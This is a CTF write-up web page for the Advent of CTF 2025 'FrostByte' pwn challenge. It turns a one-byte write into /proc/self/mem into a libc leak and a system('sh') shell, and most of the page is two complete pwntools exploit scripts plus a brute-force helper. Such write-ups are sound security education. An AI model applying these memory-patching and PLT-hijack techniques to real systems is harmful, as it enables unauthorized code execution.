<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
<!DOCTYPE html>
<html lang="en" data-bs-theme="light">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        
        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-12-02-advent-of-ctf-2025/day-16.html">
        <link rel="shortcut icon" href="../img/favicon.ico">
        <title>Day 16 FrostByte - CTF Writeups by @jiegec</title>
        <link href="../css/bootstrap.min.css" rel="stylesheet">
        <link href="../css/fontawesome.min.css" rel="stylesheet">
        <link href="../css/brands.min.css" rel="stylesheet">
        <link href="../css/solid.min.css" rel="stylesheet">
        <link href="../css/v4-font-face.min.css" rel="stylesheet">
        <link href="../css/base.css" rel="stylesheet">
        <!-- added by @jiegec begin -->
        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
        <!-- added by @jiegec end -->
        <!-- added by @jiegec begin -->
        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
        <!-- added by @jiegec end -->

      <!-- added by @jiegec begin -->
      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
      </script>
      
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
      <script>
          window.dataLayer = window.dataLayer || [];
          function gtag() { dataLayer.push(arguments); }
          gtag('js', new Date());
      
          gtag('config', 'G-3109FRSVTT');
      </script>
      
      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
      <!-- added by @jiegec end --> 
    </head>

    <body>
        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
            <div class="container">
                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
                <!-- Expander button -->
                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <!-- Expanded navigation -->
                <div id="navbar-collapse" class="navbar-collapse collapse">
                        <!-- Main navigation -->
                        <ul class="nav navbar-nav">
                            <li class="nav-item">
                                <a href="../index.html" class="nav-link">Home</a>
                            </li>
                            <li class="nav-item">
                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
                            </li>
                            <li class="nav-item">
                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
                            </li>
                            <li class="nav-item">
                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
                            </li>
                        </ul>

                    <ul class="nav navbar-nav ms-md-auto">
                        <li class="nav-item">
                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
                                <i class="fa fa-search"></i> Search
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="container">
            <div class="row">
                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
    <div class="navbar-header">
        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
            <span class="fa fa-angle-down"></span>
        </button>
    </div>

    
    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
        <ul class="nav flex-column">
            
            <li class="nav-item" data-bs-level="1"><a href="#day-16-frostbyte" class="nav-link">Day 16 FrostByte</a>
              <ul class="nav flex-column">
              </ul>
            </li>
        </ul>
    </div>
</div></div>
                    <div class="col-md-9" role="main">

<h1 id="day-16-frostbyte">Day 16 FrostByte</h1>
<p>Decompile the attachment:</p>
<pre class="highlight"><code class="language-c">int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+Fh] [rbp-11h] BYREF
  int v5; // [rsp+10h] [rbp-10h] BYREF
  int fd; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  printf("Enter filename: ");
  fgets(filename_0, 256, stdin);
  filename_0[strcspn(filename_0, "\n")] = 0;
  printf("Enter offset: ");
  __isoc99_scanf("%d", &amp;v5);
  getchar();
  printf("Enter data: ");
  read(0, &amp;buf, 1u);
  fd = open(filename_0, 1);
  lseek(fd, v5, 0);
  write(fd, &amp;buf, 1u);
  puts("Write complete.");
  return 0;
}</code></pre>
<p>We can write to arbitrary file at arbitrary offset, but only one byte. The executable is dynamically linked, but its own functions are static. So, we can override ELF content by writing to <code>/proc/self/mem</code>.</p>
<p>But the one byte limit is too hard. What if we can let main be called multiple times? I wrote a skip to bruteforce the location and the byte written to make it work, so that we can observe extra reads from stdin:</p>
<pre class="highlight"><code class="language-python">from pwn import *
context(log_level = "DEBUG")

for offset in range(0x4012b5, 0x4013f8):
    for byte in range(256):
        # filtering of non-working offset omitted here
        p = process(["strace", "-o", "strace.log", "./chall"])
        p.recvuntil(b"Enter filename")
        p.sendline(b"/proc/self/mem")
        p.recvuntil(b"Enter offset")
        p.sendline(str(offset).encode())
        p.recvuntil(b"Enter data")
        p.send(bytes([byte]))
        p.recvall(timeout=5)
        log = open("strace.log", "r").read()
        if log.count("read(") &gt; 4:
            # possible
            print(log, byte)
            break</code></pre>
<p>Eventually, we found that, if we override the <code>ret</code> instruction at <code>0x4013f7</code> to <code>leave</code> (0xc9), then it will fallthrough to <code>_term_proc</code> and eventually go back to main again. Therefore, we can write multiple bytes.</p>
<p>Now, we need to leak libc address. Since we can write to <code>.rodata</code> section, we simply override the argument of <code>printf</code> to <code>%11$p</code>, and it will leak some libc address for us.</p>
<p>Next, to get shell, we want some function call to become <code>system("sh")</code>. The last <code>puts("Write complete.")</code> is our selected victim:</p>
<ol>
<li>Override <code>Write complete.</code> to <code>sh\x00</code></li>
<li>Because we can only override one byte at one time, write the address of <code>system</code> to <code>0x404060</code> instead of overriding <code>puts</code> address directly</li>
<li>Override the <code>jmp cs:off_404000</code> instruction in <code>.plt.sec</code> section for <code>puts</code> to <code>jmp cs:off_404060</code>, since there is only one byte in difference</li>
</ol>
<p>Attack script:</p>
<pre class="highlight"><code class="language-python">from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(log_level = "DEBUG")

#p = process(["strace", "-o", "strace.log", "./chall"])
if args.REMOTE:
    p = remote("ctf.csd.lol", 8888)
else:
    p = process(["./chall"])

def write(offset, byte):
    p.recvuntil(b"me: ")
    p.sendline(b"/proc/self/mem")
    p.recvuntil(b"Enter offset")
    p.sendline(str(offset).encode())
    p.recvuntil(b"Enter data")
    p.send(bytes([byte]))

# change
# 0x4013f7: ret
# to
# 0x4013f7: leave
# so it returns to __libc_start_main, and we can write more bytes
write(0x4013f7, 0xc9)

# override "Enter filename:" to leak libc
s = b"%11$p"
for i in range(len(s)):
    write(0x402004+i, s[i])

p.recvuntil(b"Write complete.\n")
addr = int(p.recvuntil(b" ").decode(), 0)
libc_base = addr - 0x7f46e024d1ca + 0x7f46e0223000 # next instruction of call *%rax in libc
print("libc base", hex(libc_base))

# override "Write complete." to "sh"
s = b"sh\x00"
for i in range(len(s)):
    write(0x402036+i, s[i])

# override puts to system
# 1. override data at 0x404060 near .got.plt to system
s = p64(libc_base + libc.symbols["system"])
for i in range(len(s)):
    write(0x404060+i, s[i])

# 2. let puts stub to jump to setbuf(system)
# 0x4010f4: jmp cs:off_404000
# to:
# 0x4010f4: jmp cs:off_404060
write(0x4010f6, 0x66)

# get shell
p.interactive()</code></pre>
<p>However, the remote does not send the first <code>Enter filename:</code>. The solution is to skip the first recvuntil and do the rest normally:</p>
<pre class="highlight"><code class="language-python">from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(log_level = "DEBUG")

#p = process(["strace", "-o", "strace.log", "./chall"])
if args.REMOTE:
    p = remote("ctf.csd.lol", 8888)
else:
    p = process(["./chall"])

is_first = True

def write(offset, byte):
    global is_first
    if not is_first:
        p.recvuntil(b"me: ")
    is_first = False
    p.sendline(b"/proc/self/mem")
    p.recvuntil(b"Enter offset")
    p.sendline(str(offset).encode())
    p.recvuntil(b"Enter data")
    p.send(bytes([byte]))

# change
# 0x4013f7: ret
# to
# 0x4013f7: leave
# so it returns to __libc_start_main, and we can write more bytes
write(0x4013f7, 0xc9)

# override "Enter filename:" to leak libc
s = b"%11$p"
for i in range(len(s)):
    write(0x402004+i, s[i])

p.recvuntil(b"Write complete.\n")
addr = int(p.recvuntil(b" ").decode(), 0)
libc_base = addr - 0x7f46e024d1ca + 0x7f46e0223000 # next instruction of call *%rax in libc
print("libc base", hex(libc_base))

# override "Write complete." to "sh"
s = b"sh\x00"
for i in range(len(s)):
    write(0x402036+i, s[i])

# override puts to system
# 1. override data at 0x404060 near .got.plt to system
s = p64(libc_base + libc.symbols["system"])
for i in range(len(s)):
    write(0x404060+i, s[i])

# 2. let puts stub to jump to setbuf(system)
# 0x4010f4: jmp cs:off_404000
# to:
# 0x4010f4: jmp cs:off_404060
write(0x4010f6, 0x66)

# get shell
p.interactive()</code></pre></div>

                <!-- added by @jiegec begin -->
                <div class="col-md-3"></div>
                <div class="col-md-9">
                  <script src="https://giscus.app/client.js"
                      data-repo="jiegec/ctf-writeups"
                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
                      data-category="General"
                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
                      data-mapping="pathname"
                      data-strict="1"
                      data-reactions-enabled="1"
                      data-emit-metadata="0"
                      data-input-position="top"
                      data-theme="light"
                      data-lang="en"
                      data-loading="lazy"
                      crossorigin="anonymous"
                      async>
                  </script>
                </div>
                <!-- added by @jiegec end -->
            </div>
        </div>

        <footer class="col-md-12">
            <hr>
                <p>Copyright &copy; 2025 Jiajie Chen</p>
            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
        </footer>
        <script src="../js/bootstrap.bundle.min.js"></script>
        <script>
            var base_url = "..",
                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
        </script>
        <script src="../js/base.js"></script>
        <script src="../search/main.js"></script>

        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p>From here you can search these documents. Enter your search terms below.</p>
                <form>
                    <div class="form-group">
                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                    </div>
                </form>
                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
              <table class="table">
                <thead>
                  <tr>
                    <th style="width: 20%;">Keys</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td class="help shortcut"><kbd>?</kbd></td>
                    <td>Open this help</td>
                  </tr>
                  <tr>
                    <td class="next shortcut"><kbd>n</kbd></td>
                    <td>Next page</td>
                  </tr>
                  <tr>
                    <td class="prev shortcut"><kbd>p</kbd></td>
                    <td>Previous page</td>
                  </tr>
                  <tr>
                    <td class="search shortcut"><kbd>s</kbd></td>
                    <td>Search</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div>

    </body>
</html>
